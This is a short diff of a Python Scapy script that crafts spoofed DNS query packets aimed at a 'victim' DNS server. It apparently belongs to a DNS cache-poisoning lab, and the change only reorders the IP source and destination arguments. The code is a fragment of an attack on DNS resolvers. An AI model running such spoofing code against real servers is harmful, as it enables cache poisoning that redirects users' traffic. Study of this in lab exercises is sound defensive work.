@@ -23,7 +23,7 @@ Qdsec = DNSQR(qname=random_hostname)                                         # C
 dns = DNS(id=0xAAAA,qr=0,qdcount=1,ancount=0,nscount=0,arcount=0,qd=Qdsec)   # Create DNS packet
 
 # ip = IP(dst=victim_dns_server, src="10.9.0.1")                               # Attacker ip -> Victim's DNS server ip
-ip  = IP(dst=victim_dns_server ,src ='1.2.3.4' )
+ip  = IP(src ='1.2.3.4',dst=victim_dns_server  )
 udp = UDP(dport=dest_port, sport=src_port,chksum=0)                                   # UDP header
 request = ip / udp / dns                                                     # Full request packet
 
